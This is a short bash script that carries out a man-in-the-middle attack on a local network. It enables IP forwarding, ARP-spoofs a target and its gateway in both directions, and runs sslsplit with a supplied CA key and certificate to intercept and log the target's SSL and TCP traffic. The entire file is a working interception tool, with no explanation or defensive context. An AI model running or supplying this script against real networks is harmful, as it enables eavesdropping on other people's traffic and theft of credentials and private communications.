#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "You must be root"
    exit 1
fi

if [[ $# -ne 3 ]]; then
    echo "filename.sh [NetworkInterface] [Target IP] [Gatway IP]"
    exit 1
fi

echo 1 > /proc/sys/net/ipv4/ip_forward

arpspoof -i $1 -t $2 $3 &> /dev/null  &
PID1=$!
arpspoof -i $1 -t $3 $2 &> /dev/null  &
PID2=$!

sslsplit -j /root/test -S /root/test/logdir -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 &> /dev/null &
PID3=$!

echo "Press any key to stop spoofing..."
read


kill -9 $PID1 $PID2 $PID3
echo 0 > /proc/sys/net/ipv4/ip_forward

exit 0
